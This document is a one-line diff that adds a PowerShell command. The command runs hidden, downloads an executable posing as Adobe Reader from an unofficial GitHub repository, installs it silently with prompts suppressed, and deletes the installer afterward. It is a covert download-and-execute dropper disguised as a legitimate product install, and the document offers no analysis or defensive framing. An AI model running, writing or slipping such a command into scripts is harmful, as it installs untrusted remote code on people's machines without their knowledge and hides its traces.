@@ -1,0 +1,1 @@
+powershell -WindowStyle Hidden -Command "$url='https://github.com/rexonlinerex/adobereader/blob/main/AdobeReader.exe';$exe='C:\Temp\install.exe';mkdir C:\Temp -Force|Out-Null;Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing;Start-Process $exe -ArgumentList '/VERYSILENT','/SUPPRESSMSGBOXES','/NORESTART' -NoNewWindow -Wait;Remove-Item $exe -Force"
